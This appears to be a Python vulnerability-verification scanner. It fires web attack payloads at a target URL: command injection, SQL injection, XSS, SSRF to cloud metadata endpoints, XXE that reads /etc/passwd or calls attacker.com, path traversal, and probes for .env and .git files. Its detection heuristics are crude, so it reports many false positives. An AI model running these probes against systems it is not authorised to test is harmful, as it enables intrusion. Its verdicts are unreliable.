# scanners/vulnerability_verifier.py
from typing import Dict, List, Optional, Tuple
import requests
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs
import json


class VulnerabilityVerifier:
    
    def __init__(self, timeout: int = 10, retries: int = 3):
        self.timeout = timeout
        self.retries = retries
        self.session = self._create_session()
    
    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        return session
    
    def verify_vulnerability(self, cve_data: Dict, target_url: str) -> Dict:
        result = {
            'cve_id': cve_data['id'],
            'target': target_url,
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'NONE',
            'response_time': 0,
            'details': {}
        }
        
        category = cve_data.get('category', 'UNKNOWN')
        
        verifiers = {
            'RCE': self.verify_rce,
            'SQLi': self.verify_sqli,
            'XSS': self.verify_xss,
            'SSRF': self.verify_ssrf,
            'XXE': self.verify_xxe,
            'SSTI': self.verify_ssti,
            'PATH_TRAVERSAL': self.verify_path_traversal,
            'LFI': self.verify_lfi,
            'DESERIALIZATION': self.verify_deserialization,
            'INFO_DISCLOSURE': self.verify_info_disclosure,
            'MISCONFIGURATION': self.verify_misconfiguration
        }
        
        verifier = verifiers.get(category, self.verify_generic)
        verified_result = verifier(target_url, cve_data)
        
        result.update(verified_result)
        return result
    
    def verify_rce(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'RCE_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        test_payloads = [
            {'payload': 'test_param=`id`', 'indicator': 'uid=', 'method': 'GET'},
            {'payload': 'cmd=whoami', 'indicator': 'root|administrator|system', 'method': 'GET'},
            {'payload': 'exec=sleep 2', 'indicator': 'response_delay', 'method': 'GET'}
        ]
        
        for test in test_payloads:
            try:
                start_time = time.time()
                
                if test['method'] == 'GET':
                    test_url = f"{target_url}?{test['payload']}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                else:
                    response = self.session.post(target_url, data=test['payload'], 
                                               timeout=self.timeout, verify=False)
                
                response_time = time.time() - start_time
                result['response_time'] = response_time
                
                if test['indicator'] == 'response_delay' and response_time > 2:
                    result['is_vulnerable'] = True
                    result['confidence'] = 0.7
                    result['evidence'].append(f'Time-based RCE detected: {response_time:.2f}s delay')
                    result['verification_method'] = 'TIME_BASED'
                    return result
                
                if test['indicator'] != 'response_delay':
                    if re.search(test['indicator'], response.text, re.IGNORECASE):
                        result['is_vulnerable'] = True
                        result['confidence'] = 0.9
                        result['evidence'].append(f"RCE indicator found: {test['indicator']}")
                        result['verification_method'] = 'PAYLOAD_RESPONSE'
                        return result
                
            except requests.Timeout:
                result['evidence'].append('Timeout detected - possible time-based RCE')
                result['is_vulnerable'] = True
                result['confidence'] = 0.6
                result['verification_method'] = 'TIMEOUT_BASED'
                return result
            except Exception:
                continue
        
        return result
    
    def verify_sqli(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'SQLI_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        sql_tests = [
            {'payload': "' OR '1'='1", 'type': 'OR_BASED'},
            {'payload': "' UNION SELECT NULL,NULL--", 'type': 'UNION_BASED'},
            {'payload': "' AND 1=1--", 'type': 'AND_BASED'},
            {'payload': "' AND SLEEP(2)--", 'type': 'TIME_BASED'}
        ]
        
        identified_params = self._identify_injectable_params(target_url)
        
        for param in identified_params[:3]:
            baseline = self._get_baseline_response(target_url, param)
            
            for test in sql_tests:
                try:
                    test_url = f"{target_url}?{param}={test['payload']}"
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    response_time = time.time() - start_time
                    
                    if test['type'] == 'TIME_BASED' and response_time > 3:
                        result['is_vulnerable'] = True
                        result['confidence'] = 0.85
                        result['evidence'].append(f'Time-based SQLi detected on param {param}')
                        result['verification_method'] = 'TIME_BASED'
                        result['details']['vulnerable_parameter'] = param
                        result['details']['payload_type'] = test['type']
                        return result
                    
                    sql_errors = [
                        'SQL syntax', 'mysql_', 'sqlite', 'postgresql', 'oracle',
                        'SQLSTATE', 'SQL error', 'unclosed quotation'
                    ]
                    
                    if any(err in response.text for err in sql_errors):
                        result['is_vulnerable'] = True
                        result['confidence'] = 0.95
                        result['evidence'].append(f'SQL error detected on param {param}')
                        result['verification_method'] = 'ERROR_BASED'
                        result['details']['vulnerable_parameter'] = param
                        result['details']['error_found'] = True
                        return result
                    
                    if len(response.text) != len(baseline) and abs(len(response.text) - len(baseline)) > 100:
                        result['is_vulnerable'] = True
                        result['confidence'] = 0.7
                        result['evidence'].append(f'Response size difference detected on param {param}')
                        result['verification_method'] = 'RESPONSE_DIFF'
                        result['details']['vulnerable_parameter'] = param
                        return result
                        
                except Exception:
                    continue
        
        return result
    
    def verify_xss(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'XSS_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            'javascript:alert(1)'
        ]
        
        identified_params = self._identify_injectable_params(target_url)
        
        for param in identified_params[:3]:
            for payload in xss_payloads:
                try:
                    test_url = f"{target_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    if payload in response.text:
                        result['is_vulnerable'] = True
                        result['confidence'] = 0.9
                        result['evidence'].append(f'XSS payload reflected on param {param}')
                        result['verification_method'] = 'REFLECTED'
                        result['details']['vulnerable_parameter'] = param
                        result['details']['payload'] = payload
                        return result
                    
                    if '<script>' in response.text and response.status_code == 200:
                        result['is_vulnerable'] = True
                        result['confidence'] = 0.7
                        result['evidence'].append(f'Script tags found in response for param {param}')
                        result['verification_method'] = 'SCRIPT_DETECTION'
                        return result
                        
                except Exception:
                    continue
        
        return result
    
    def verify_ssrf(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'SSRF_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        ssrf_payloads = [
            'http://127.0.0.1:8080',
            'http://localhost:8080',
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/'
        ]
        
        identified_params = self._identify_injectable_params(target_url)
        
        for param in identified_params[:2]:
            for payload in ssrf_payloads:
                try:
                    test_url = f"{target_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout * 2, verify=False)
                    
                    if 'metadata' in response.text.lower() or 'credentials' in response.text.lower():
                        result['is_vulnerable'] = True
                        result['confidence'] = 0.85
                        result['evidence'].append(f'Metadata/sensitive data exposed via param {param}')
                        result['verification_method'] = 'METADATA_ACCESS'
                        result['details']['vulnerable_parameter'] = param
                        return result
                    
                    if response.status_code == 200 and len(response.text) > 100:
                        result['is_vulnerable'] = True
                        result['confidence'] = 0.7
                        result['evidence'].append(f'Unexpected response from internal resource')
                        result['verification_method'] = 'RESPONSE_ANALYSIS'
                        return result
                        
                except requests.ConnectionError:
                    result['is_vulnerable'] = True
                    result['confidence'] = 0.6
                    result['evidence'].append('Connection to internal resource detected')
                    return result
                except Exception:
                    continue
        
        return result
    
    def verify_xxe(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'XXE_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com">]><test>&xxe;</test>'
        ]
        
        for payload in xxe_payloads:
            try:
                response = self.session.post(target_url, data=payload,
                                           headers={'Content-Type': 'application/xml'},
                                           timeout=self.timeout, verify=False)
                
                if 'root:' in response.text or 'daemon:' in response.text:
                    result['is_vulnerable'] = True
                    result['confidence'] = 0.95
                    result['evidence'].append('XXE file disclosure detected')
                    result['verification_method'] = 'FILE_DISCLOSURE'
                    return result
                
                if 'XML' in response.text or 'xml' in response.text:
                    result['is_vulnerable'] = True
                    result['confidence'] = 0.6
                    result['evidence'].append('XML processing detected')
                    result['verification_method'] = 'XML_PROCESSING'
                    return result
                    
            except Exception:
                continue
        
        return result
    
    def verify_ssti(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'SSTI_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        ssti_payloads = [
            ('{{7*7}}', '49'),
            ('${7*7}', '49'),
            ('<%= 7*7 %>', '49'),
            ('[=7*7=]', '49')
        ]
        
        identified_params = self._identify_injectable_params(target_url)
        
        for param in identified_params[:3]:
            for payload, expected in ssti_payloads:
                try:
                    test_url = f"{target_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    if expected in response.text:
                        result['is_vulnerable'] = True
                        result['confidence'] = 0.95
                        result['evidence'].append(f'SSTI expression evaluated on param {param}')
                        result['verification_method'] = 'EXPRESSION_EVAL'
                        result['details']['vulnerable_parameter'] = param
                        result['details']['expression'] = payload
                        result['details']['result'] = expected
                        return result
                        
                except Exception:
                    continue
        
        return result
    
    def verify_path_traversal(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'PATH_TRAVERSAL_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        traversal_payloads = [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd'
        ]
        
        identified_params = self._identify_injectable_params(target_url)
        
        for param in identified_params[:3]:
            for payload in traversal_payloads:
                try:
                    test_url = f"{target_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200:
                        if 'root:' in response.text or '[boot loader]' in response.text:
                            result['is_vulnerable'] = True
                            result['confidence'] = 0.95
                            result['evidence'].append(f'System file content disclosed via {param}')
                            result['verification_method'] = 'FILE_CONTENT'
                            result['details']['vulnerable_parameter'] = param
                            return result
                        
                        if len(response.text) > 500:
                            result['is_vulnerable'] = True
                            result['confidence'] = 0.7
                            result['evidence'].append(f'Unusual file content returned from {param}')
                            result['verification_method'] = 'CONTENT_SIZE'
                            return result
                            
                except Exception:
                    continue
        
        return result
    
    def verify_lfi(self, target_url: str, cve_data: Dict) -> Dict:
        return self.verify_path_traversal(target_url, cve_data)
    
    def verify_deserialization(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'DESERIALIZATION_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        if 'Java' in cve_data.get('description', '') or 'java' in cve_data.get('patterns', []):
            result['evidence'].append('Java deserialization framework detected')
            result['is_vulnerable'] = True
            result['confidence'] = 0.5
            result['verification_method'] = 'FRAMEWORK_DETECTION'
        
        return result
    
    def verify_info_disclosure(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'INFO_DISCLOSURE_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        sensitive_paths = [
            '/.git/config',
            '/.env',
            '/web.config',
            '/config.php',
            '/admin',
            '/.well-known/security.txt'
        ]
        
        for path in sensitive_paths:
            try:
                test_url = urljoin(target_url, path)
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                if response.status_code == 200:
                    result['is_vulnerable'] = True
                    result['confidence'] = 0.8
                    result['evidence'].append(f'Sensitive file/path accessible: {path}')
                    result['verification_method'] = 'PATH_ACCESS'
                    result['details']['accessible_path'] = path
                    return result
                    
            except Exception:
                continue
        
        return result
    
    def verify_misconfiguration(self, target_url: str, cve_data: Dict) -> Dict:
        result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'verification_method': 'MISCONFIGURATION_DETECTION',
            'response_time': 0,
            'details': {}
        }
        
        try:
            response = self.session.get(target_url, timeout=self.timeout, verify=False)
            
            debug_indicators = ['debug', 'test', 'localhost', '127.0.0.1', 'password', 'secret']
            found_indicators = [ind for ind in debug_indicators if ind in response.text.lower()]
            
            if found_indicators:
                result['is_vulnerable'] = True
                result['confidence'] = 0.6
                result['evidence'].append(f'Debug/sensitive indicators found: {", ".join(found_indicators)}')
                result['verification_method'] = 'DEBUG_DETECTION'
                
        except Exception:
            pass
        
        return result
    
    def verify_generic(self, target_url: str, cve_data: Dict) -> Dict:
        return {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': ['Generic verification not available'],
            'verification_method': 'GENERIC_CHECK',
            'response_time': 0,
            'details': {}
        }
    
    def _identify_injectable_params(self, target_url: str) -> List[str]:
        params = []
        
        parsed = urlparse(target_url)
        query_params = parse_qs(parsed.query)
        params.extend(query_params.keys())
        
        common_params = ['id', 'q', 'search', 'query', 'keyword', 'name', 'user', 'file', 'page', 'data']
        params.extend(common_params)
        
        return list(set(params))[:5]
    
    def _get_baseline_response(self, target_url: str, param: str) -> requests.Response:
        try:
            test_url = f"{target_url}?{param}=baseline123456"
            return self.session.get(test_url, timeout=self.timeout, verify=False)
        except:
            return None
